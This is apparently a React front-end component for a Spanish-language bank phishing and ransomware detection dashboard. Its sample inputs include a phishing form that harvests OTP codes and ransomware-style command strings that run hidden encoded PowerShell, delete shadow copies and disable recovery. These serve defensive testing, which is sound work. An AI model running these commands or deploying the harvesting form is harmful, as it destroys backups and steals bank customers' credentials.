import React, { useState } from 'react';
import { Search, ShieldAlert, CheckCircle, AlertTriangle, Cpu, Lock, Mail, QrCode, Eye } from 'lucide-react';
import { URLAnalysisResult, ChannelType } from '../../types';

export const UrlScannerView: React.FC = () => {
  const [subTab, setSubTab] = useState<'url' | 'email' | 'qr' | 'visual' | 'ransomware'>('url');

  // --- URL Scanner ---
  const [url, setUrl] = useState('https://xn--banc-9na.com/auth/login.php');
  const [channel, setChannel] = useState<ChannelType>('WEB');
  const [forceDeepScan, setForceDeepScan] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<URLAnalysisResult | null>(null);

  // --- Email / SMS Scanner ---
  const [emailSender, setEmailSender] = useState('alertas@banco-seguridad-verificacion.xyz');
  const [emailSubject, setEmailSubject] = useState('URGENTE: Cuenta bloqueada - Verifique su Token OTP');
  const [emailBody, setEmailBody] = useState('Detectamos un acceso inusual. Ingrese a https://banco-seguro-verificacion.xyz/token para evitar suspensión.');
  const [emailHtml, setEmailHtml] = useState('<form action="https://banco-seguro-verificacion.xyz/harvest.php"><input type="password" name="otp_pin"/></form>');
  const [emailResult, setEmailResult] = useState<any | null>(null);

  // --- QR Quishing ---
  const [qrPayload, setQrPayload] = useState('https://qr-auth-banco-token.xyz/validate?terminal=POS-8821');
  const [qrResult, setQrResult] = useState<any | null>(null);

  // --- Visual Clone ---
  const [cloneUrl, setCloneUrl] = useState('https://banca-personas-login.xyz/portal');
  const [domSim, setDomSim] = useState(94.8);
  const [logoDistance, setLogoDistance] = useState(2);
  const [visualResult, setVisualResult] = useState<any | null>(null);

  // --- Anti-Ransomware Sandbox ---
  const [rswFilename, setRswFilename] = useState('Liquidacion_SWIFT_BCRP_Octubre.pdf.iso');
  const [rswHash, setRswHash] = useState('8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4');
  const [rswHost, setRswHost] = useState('WKST-TESORERIA-042.aegisbank.local');
  const [rswBehavior, setRswBehavior] = useState(
    'powershell.exe -nop -w hidden -enc JABz... | vssadmin.exe delete shadows /all /quiet | bcdedit /set {default} recoveryenabled No'
  );
  const [rswResult, setRswResult] = useState<any | null>(null);

  const handleUrlScan = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!url) return;
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/v1/detection/analyze-url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url, channel, force_deep_scan: forceDeepScan }),
      });
      if (response.ok) setResult(await response.json());
    } finally {
      setIsLoading(false);
    }
  };

  const handleEmailScan = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/v1/detection/analyze-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sender: emailSender,
          recipient: 'cuentahabiente@banco.com',
          subject: emailSubject,
          body_text: emailBody,
          body_html: emailHtml,
        }),
      });
      if (response.ok) setEmailResult(await response.json());
    } finally {
      setIsLoading(false);
    }
  };

  const handleQrScan = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/v1/detection/analyze-qr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ extracted_payload_url: qrPayload }),
      });
      if (response.ok) setQrResult(await response.json());
    } finally {
      setIsLoading(false);
    }
  };

  const handleVisualCloneScan = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/v1/detection/analyze-visual-clone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          target_url: cloneUrl,
          dom_similarity_pct: domSim,
          css_hash_match: true,
          logo_phash_distance: logoDistance,
        }),
      });
      if (response.ok) setVisualResult(await response.json());
    } finally {
      setIsLoading(false);
    }
  };

  const handleRansomwareScan = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/v1/detection/analyze-ransomware', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: rswFilename,
          sha256_hash: rswHash,
          sender_email: 'liquidaciones-swift@bcrp-regulacion-pe.com',
          behavior_indicators: rswBehavior,
          target_host: rswHost,
        }),
      });
      if (response.ok) setRswResult(await response.json());
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Segmented Control Limpio */}
      <div className="inline-flex flex-wrap gap-1.5 bg-slate-200/70 dark:bg-slate-900 p-1.5 rounded-2xl border border-slate-200 dark:border-slate-800">
        {[
          { id: 'url', label: 'URL & Dominio', icon: <Search className="w-4 h-4" /> },
          { id: 'email', label: 'Correo / SMS', icon: <Mail className="w-4 h-4" /> },
          { id: 'qr', label: 'Quishing (QR)', icon: <QrCode className="w-4 h-4" /> },
          { id: 'visual', label: 'Sitio Clonado', icon: <Eye className="w-4 h-4" /> },
          { id: 'ransomware', label: 'Anti-Ransomware (Sandbox)', icon: <Lock className="w-4 h-4" /> },
        ].map((t) => (
          <button
            key={t.id}
            onClick={() => setSubTab(t.id as any)}
            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-semibold transition-all ${
              subTab === t.id
                ? 'bg-white dark:bg-blue-600 text-slate-900 dark:text-white shadow-sm'
                : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
            }`}
          >
            {t.icon}
            <span>{t.label}</span>
          </button>
        ))}
      </div>

      {/* 1. URL SCANNER */}
      {subTab === 'url' && (
        <div className="bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 p-6 rounded-2xl shadow-sm space-y-5">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div>
              <h2 className="text-base font-bold text-slate-900 dark:text-white">Inspección de URLs y Dominios</h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">WHOIS, DNS, TLS, entropía, typosquatting y homógrafos</p>
            </div>
            <div className="flex gap-1.5 text-[11px]">
              <button type="button" onClick={() => setUrl('https://xn--banc-9na.com/login')} className="px-2.5 py-1 bg-rose-50 dark:bg-rose-500/10 text-rose-600 dark:text-rose-400 rounded-lg font-medium hover:opacity-80">
                Probar Homógrafo
              </button>
              <button type="button" onClick={() => setUrl('https://banco-seguro-verificacion.xyz/token')} className="px-2.5 py-1 bg-amber-50 dark:bg-amber-500/10 text-amber-600 dark:text-amber-400 rounded-lg font-medium hover:opacity-80">
                Probar Typosquatting
              </button>
              <button type="button" onClick={() => setUrl('https://banco.com/personas')} className="px-2.5 py-1 bg-emerald-50 dark:bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 rounded-lg font-medium hover:opacity-80">
                Probar Oficial
              </button>
            </div>
          </div>

          <form onSubmit={handleUrlScan} className="space-y-3">
            <div className="flex flex-col md:flex-row gap-3">
              <input
                type="text"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                placeholder="https://..."
                className="flex-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-4 py-2.5 rounded-xl text-sm text-slate-900 dark:text-white focus:outline-none focus:border-blue-500"
                required
              />
              <select
                value={channel}
                onChange={(e) => setChannel(e.target.value as ChannelType)}
                className="bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2.5 rounded-xl text-xs font-medium text-slate-700 dark:text-slate-300"
              >
                <option value="WEB">Canal Web</option>
                <option value="EMAIL">Canal Email</option>
                <option value="SMS">Canal SMS</option>
                <option value="QR">Canal QR</option>
              </select>
              <button
                type="submit"
                disabled={isLoading}
                className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-6 py-2.5 rounded-xl text-xs transition-all shadow-sm"
              >
                {isLoading ? 'Analizando...' : 'Analizar Ahora'}
              </button>
            </div>
            <label className="inline-flex items-center gap-2 cursor-pointer text-xs text-slate-600 dark:text-slate-400">
              <input
                type="checkbox"
                checked={forceDeepScan}
                onChange={(e) => setForceDeepScan(e.target.checked)}
                className="rounded border-slate-300 dark:border-slate-700 text-blue-600"
              />
              <Cpu className="w-3.5 h-3.5 text-blue-500" />
              Activar razonamiento con Agente IA (LangChain)
            </label>
          </form>

          {result && (
            <div className="pt-5 border-t border-slate-100 dark:border-slate-800 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div className="flex items-center gap-3">
                  {result.verdict === 'MALICIOUS' ? (
                    <span className="flex items-center gap-1.5 px-3 py-1 bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20 rounded-full font-bold text-xs">
                      <ShieldAlert className="w-4 h-4" /> MALICIOSO
                    </span>
                  ) : result.verdict === 'SUSPICIOUS' ? (
                    <span className="flex items-center gap-1.5 px-3 py-1 bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20 rounded-full font-bold text-xs">
                      <AlertTriangle className="w-4 h-4" /> SOSPECHOSO
                    </span>
                  ) : (
                    <span className="flex items-center gap-1.5 px-3 py-1 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 rounded-full font-bold text-xs">
                      <CheckCircle className="w-4 h-4" /> SEGURO
                    </span>
                  )}
                  <span className="text-xs text-slate-500">Confianza {(result.confidence * 100).toFixed(0)}%</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-slate-500">Riesgo:</span>
                  <span className={`text-xl font-extrabold ${result.risk_score >= 65 ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
                    {result.risk_score}/100
                  </span>
                </div>
              </div>

              <div className="grid grid-cols-2 md:grid-cols-5 gap-3 text-xs">
                <div className="bg-slate-50 dark:bg-slate-950 p-3.5 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block mb-0.5">Typosquatting</span>
                  <span className={`font-bold ${result.domain_features.typosquatting_detected ? 'text-rose-600 dark:text-rose-400' : 'text-slate-800 dark:text-slate-200'}`}>
                    {result.domain_features.typosquatting_detected ? 'Detectado' : 'Limpio'}
                  </span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3.5 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block mb-0.5">Homógrafo IDN</span>
                  <span className={`font-bold ${result.domain_features.homograph_detected ? 'text-rose-600 dark:text-rose-400' : 'text-slate-800 dark:text-slate-200'}`}>
                    {result.domain_features.homograph_detected ? 'Punycode Hostil' : 'Limpio'}
                  </span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3.5 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block mb-0.5">Entropía</span>
                  <span className="font-bold text-slate-800 dark:text-slate-200">{result.domain_features.entropy.toFixed(2)} bits</span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3.5 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block mb-0.5">Edad Dominio</span>
                  <span className="font-bold text-slate-800 dark:text-slate-200">{result.domain_features.domain_age_days ?? 3} días</span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3.5 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block mb-0.5">DNS / TLS</span>
                  <span className="font-bold text-slate-800 dark:text-slate-200 flex items-center gap-1">
                    {result.domain_features.dns_resolves ? 'DNS Activo' : 'Inactivo'}
                    {result.domain_features.has_valid_tls && <Lock className="w-3.5 h-3.5 text-emerald-500" />}
                  </span>
                </div>
              </div>

              {result.llm_rationale && (
                <div className="bg-blue-50/70 dark:bg-blue-950/30 border border-blue-200/70 dark:border-blue-800/50 p-4 rounded-xl text-xs text-slate-700 dark:text-slate-200">
                  <span className="font-bold text-blue-600 dark:text-blue-400 block mb-1">Dictamen IA (LangChain):</span>
                  {result.llm_rationale}
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* 2. EMAIL / SMS SCANNER */}
      {subTab === 'email' && (
        <div className="bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 p-6 rounded-2xl shadow-sm space-y-4">
          <div>
            <h2 className="text-base font-bold text-slate-900 dark:text-white">Inspector de Correo y SMS</h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">Validación SPF/DKIM/DMARC, HTML y señuelos de urgencia</p>
          </div>
          <form onSubmit={handleEmailScan} className="space-y-3 text-xs">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div>
                <label className="text-slate-500 dark:text-slate-400 font-medium block mb-1">Remitente</label>
                <input
                  type="text"
                  value={emailSender}
                  onChange={(e) => setEmailSender(e.target.value)}
                  className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white"
                />
              </div>
              <div>
                <label className="text-slate-500 dark:text-slate-400 font-medium block mb-1">Asunto</label>
                <input
                  type="text"
                  value={emailSubject}
                  onChange={(e) => setEmailSubject(e.target.value)}
                  className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white"
                />
              </div>
            </div>
            <div>
              <label className="text-slate-500 dark:text-slate-400 font-medium block mb-1">Mensaje (Texto)</label>
              <textarea
                rows={2}
                value={emailBody}
                onChange={(e) => setEmailBody(e.target.value)}
                className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 p-3 rounded-xl text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="text-slate-500 dark:text-slate-400 font-medium block mb-1">Fragmento HTML</label>
              <input
                type="text"
                value={emailHtml}
                onChange={(e) => setEmailHtml(e.target.value)}
                className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl font-mono text-amber-600 dark:text-amber-300"
              />
            </div>
            <button type="submit" className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-5 py-2.5 rounded-xl">
              Evaluar Mensaje
            </button>
          </form>

          {emailResult && (
            <div className="pt-4 border-t border-slate-100 dark:border-slate-800 grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
              <div className="bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200/70 dark:border-slate-800">
                <span className="text-slate-400 block">Resultado</span>
                <span className="text-base font-extrabold text-rose-600 dark:text-rose-400">{emailResult.verdict} ({emailResult.risk_score}/100)</span>
              </div>
              <div className="bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200/70 dark:border-slate-800 space-y-1">
                <p>SPF: <b className="text-amber-600 dark:text-amber-400">{emailResult.spoofing_indicators?.spf_record}</b></p>
                <p>DKIM: <b className="text-rose-600 dark:text-rose-400">{emailResult.spoofing_indicators?.dkim_signature}</b></p>
                <p>DMARC: <b className="text-rose-600 dark:text-rose-400">{emailResult.spoofing_indicators?.dmarc_policy}</b></p>
              </div>
              <div className="bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200/70 dark:border-slate-800">
                <p className="font-bold text-slate-800 dark:text-white">{emailResult.llm_analysis?.social_engineering_technique}</p>
                <p className="text-amber-600 dark:text-amber-300 mt-1">{emailResult.llm_analysis?.visual_html_inspection}</p>
              </div>
            </div>
          )}
        </div>
      )}

      {/* 3. QUISHING QR */}
      {subTab === 'qr' && (
        <div className="bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 p-6 rounded-2xl shadow-sm space-y-4">
          <div>
            <h2 className="text-base font-bold text-slate-900 dark:text-white">Decodificador Quishing (QR)</h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">Inspección de enlaces ocultos en códigos QR</p>
          </div>
          <form onSubmit={handleQrScan} className="flex gap-3">
            <input
              type="text"
              value={qrPayload}
              onChange={(e) => setQrPayload(e.target.value)}
              className="flex-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-4 py-2.5 rounded-xl text-sm text-slate-900 dark:text-white"
            />
            <button type="submit" className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-6 py-2.5 rounded-xl text-xs">
              Analizar QR
            </button>
          </form>
          {qrResult && (
            <div className="bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200 dark:border-slate-800 text-xs space-y-1.5">
              <div className="flex justify-between font-bold">
                <span className="text-blue-600 dark:text-blue-400">Caso: {qrResult.incident_number}</span>
                <span className="text-rose-600 dark:text-rose-400">{qrResult.verdict} (Score: {qrResult.risk_score}/100)</span>
              </div>
              <p className="text-slate-600 dark:text-slate-300">{qrResult.quishing_evasion_analysis}</p>
            </div>
          )}
        </div>
      )}

      {/* 4. SITIO CLONADO */}
      {subTab === 'visual' && (
        <div className="bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 p-6 rounded-2xl shadow-sm space-y-4">
          <div>
            <h2 className="text-base font-bold text-slate-900 dark:text-white">Similitud Visual de Portales Clonados</h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">Comparación de estructura DOM, CSS y pHash del logo</p>
          </div>
          <form onSubmit={handleVisualCloneScan} className="grid grid-cols-1 md:grid-cols-4 gap-3 text-xs items-end">
            <div className="md:col-span-2">
              <label className="text-slate-500 dark:text-slate-400 block mb-1">URL Sospechosa</label>
              <input
                type="text"
                value={cloneUrl}
                onChange={(e) => setCloneUrl(e.target.value)}
                className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="text-slate-500 dark:text-slate-400 block mb-1">Similitud DOM (%)</label>
              <input
                type="number"
                step="0.1"
                value={domSim}
                onChange={(e) => setDomSim(Number(e.target.value))}
                className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white"
              />
            </div>
            <button type="submit" className="bg-rose-600 hover:bg-rose-500 text-white font-semibold px-4 py-2 rounded-xl">
              Comparar Sitio
            </button>
          </form>
          {visualResult && (
            <div className="bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200 dark:border-slate-800 text-xs space-y-1">
              <p className="font-bold text-rose-600 dark:text-rose-400">
                {visualResult.is_cloned_banking_portal ? 'PORTAL BANCARIO CLONADO DETECTADO' : 'Sitio distinto'} — Riesgo: {visualResult.risk_score}/100
              </p>
              <p className="text-slate-600 dark:text-slate-300">{visualResult.metrics?.aitm_reverse_proxy_indicators}</p>
            </div>
          )}
        </div>
      )}

      {/* 5. ANTI-RANSOMWARE & SANDBOX DE ADJUNTOS */}
      {subTab === 'ransomware' && (
        <div className="bg-white dark:bg-slate-900 border border-slate-200/80 dark:border-slate-800 p-6 rounded-2xl shadow-sm space-y-5">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div>
              <h2 className="text-base font-bold text-slate-900 dark:text-white">
                Defensa Pre-Ransomware & Sandbox de Adjuntos Phishing
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Detección temprana (Left-of-Boom) de droppers LockBit 3.0, BlackBasta y QakBot distribuidos por Spear-Phishing (MITRE T1566.001 → T1486)
              </p>
            </div>
            <div className="flex gap-1.5 text-[11px]">
              <button
                type="button"
                onClick={() => {
                  setRswFilename('Liquidacion_SWIFT_BCRP_Octubre.pdf.iso');
                  setRswBehavior('powershell.exe -nop -w hidden -enc JABz... | vssadmin.exe delete shadows /all /quiet | bcdedit /set {default} recoveryenabled No');
                }}
                className="px-2.5 py-1 bg-rose-50 dark:bg-rose-500/10 text-rose-600 dark:text-rose-400 rounded-lg font-medium hover:opacity-80"
              >
                LockBit 3.0 (.ISO)
              </button>
              <button
                type="button"
                onClick={() => {
                  setRswFilename('Conciliacion_Tesoreria_2026.xlsm');
                  setRswBehavior('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication" | wmic shadowcopy delete');
                }}
                className="px-2.5 py-1 bg-amber-50 dark:bg-amber-500/10 text-amber-600 dark:text-amber-400 rounded-lg font-medium hover:opacity-80"
              >
                BlackBasta (.XLSM)
              </button>
              <button
                type="button"
                onClick={() => {
                  setRswFilename('Estado_Cuenta_Mensual.pdf');
                  setRswBehavior('AcroRd32.exe /n Estado_Cuenta_Mensual.pdf (Sin llamadas a procesos hijos)');
                }}
                className="px-2.5 py-1 bg-emerald-50 dark:bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 rounded-lg font-medium hover:opacity-80"
              >
                PDF Limpio
              </button>
            </div>
          </div>

          <form onSubmit={handleRansomwareScan} className="space-y-3 text-xs">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              <div>
                <label className="text-slate-500 dark:text-slate-400 block mb-1 font-medium">Adjunto Interceptado</label>
                <input
                  type="text"
                  value={rswFilename}
                  onChange={(e) => setRswFilename(e.target.value)}
                  className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white font-mono"
                />
              </div>
              <div>
                <label className="text-slate-500 dark:text-slate-400 block mb-1 font-medium">Host Destino (Endpoint Bancario)</label>
                <input
                  type="text"
                  value={rswHost}
                  onChange={(e) => setRswHost(e.target.value)}
                  className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white font-mono"
                />
              </div>
              <div>
                <label className="text-slate-500 dark:text-slate-400 block mb-1 font-medium">SHA-256 del Artefacto</label>
                <input
                  type="text"
                  value={rswHash}
                  onChange={(e) => setRswHash(e.target.value)}
                  className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white font-mono"
                />
              </div>
            </div>

            <div>
              <label className="text-slate-500 dark:text-slate-400 block mb-1 font-medium">
                Telemetría Sandbox / Árbol de Procesos (Detonación en Entorno Aislado)
              </label>
              <input
                type="text"
                value={rswBehavior}
                onChange={(e) => setRswBehavior(e.target.value)}
                className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-800 px-3.5 py-2 rounded-xl text-slate-900 dark:text-white font-mono"
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="bg-rose-600 hover:bg-rose-500 text-white font-semibold px-5 py-2.5 rounded-xl transition shadow-sm"
            >
              {isLoading ? 'Detonando en Sandbox...' : 'Analizar Adjunto & Prevenir Ransomware'}
            </button>
          </form>

          {rswResult && (
            <div className="pt-4 border-t border-slate-200 dark:border-slate-800 space-y-4 text-xs">
              {/* Banner Veredicto */}
              <div className="flex flex-wrap items-center justify-between gap-3 bg-slate-50 dark:bg-slate-950 p-4 rounded-xl border border-slate-200 dark:border-slate-800">
                <div>
                  <span className="text-[10px] font-bold uppercase tracking-wider text-rose-600 dark:text-rose-400">
                    Familia Detectada
                  </span>
                  <p className="text-sm font-bold text-slate-900 dark:text-white mt-0.5">
                    {rswResult.ransomware_family}
                  </p>
                  {rswResult.incident_number && (
                    <p className="text-[11px] text-blue-600 dark:text-blue-400 font-medium mt-0.5">
                      Incidente Creado y Contenido: {rswResult.incident_number}
                    </p>
                  )}
                </div>
                <div className="text-right">
                  <span
                    className={`px-3 py-1 rounded-full font-bold text-xs ${
                      rswResult.verdict === 'MALICIOUS'
                        ? 'bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30'
                        : 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30'
                    }`}
                  >
                    {rswResult.verdict} · Riesgo {rswResult.risk_score}/100
                  </span>
                </div>
              </div>

              {/* Indicadores Estáticos y YARA */}
              <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5">
                <div className="bg-slate-50 dark:bg-slate-950 p-3 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block">Doble Extensión</span>
                  <span className="font-bold text-slate-900 dark:text-white">
                    {rswResult.static_indicators?.double_extension_spoofing ? 'SÍ (.pdf.iso)' : 'No'}
                  </span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block">Bypass Mark-of-the-Web</span>
                  <span className="font-bold text-slate-900 dark:text-white">
                    {rswResult.static_indicators?.motw_container_bypass ? 'DETECTADO' : 'No'}
                  </span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block">Borrado Shadow Copies</span>
                  <span className="font-bold text-rose-600 dark:text-rose-400">
                    {rswResult.static_indicators?.shadow_copy_deletion_attempt ? 'VSSADMIN DETECTADO' : 'No'}
                  </span>
                </div>
                <div className="bg-slate-50 dark:bg-slate-950 p-3 rounded-xl border border-slate-200/70 dark:border-slate-800">
                  <span className="text-slate-400 block">Entropía del Binario</span>
                  <span className="font-bold text-slate-900 dark:text-white">
                    {rswResult.static_indicators?.entropy_score} bits/byte
                  </span>
                </div>
              </div>

              {/* Cadena MITRE ATT&CK Kill-Chain */}
              <div className="space-y-2">
                <p className="font-semibold text-slate-700 dark:text-slate-300">
                  Cadena de Ataque MITRE ATT&CK (De Spear-Phishing a Ransomware)
                </p>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-2.5">
                  {rswResult.mitre_kill_chain?.map((step: any, i: number) => (
                    <div
                      key={i}
                      className="bg-slate-50 dark:bg-slate-950 p-3 rounded-xl border border-slate-200/70 dark:border-slate-800 space-y-1"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-slate-800 dark:text-slate-200">{step.stage}</span>
                      </div>
                      <p className="text-[11px] text-slate-500 dark:text-slate-400">{step.detail}</p>
                      <span className="inline-block text-[10px] font-bold px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-600 dark:text-emerald-400">
                        {step.status}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Contención SOAR / EDR */}
              <div className="bg-emerald-50/70 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-900/50 p-4 rounded-xl space-y-1.5">
                <p className="font-bold text-emerald-800 dark:text-emerald-300 flex items-center gap-1.5">
                  <CheckCircle className="w-4 h-4" />
                  Contención Automática Pre-Cifrado Ejecutada (SOAR + EDR)
                </p>
                <ul className="space-y-1 text-emerald-700 dark:text-emerald-300/90 pl-5 list-disc">
                  {rswResult.soar_edr_actions?.map((act: string, idx: number) => (
                    <li key={idx}>{act}</li>
                  ))}
                </ul>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};
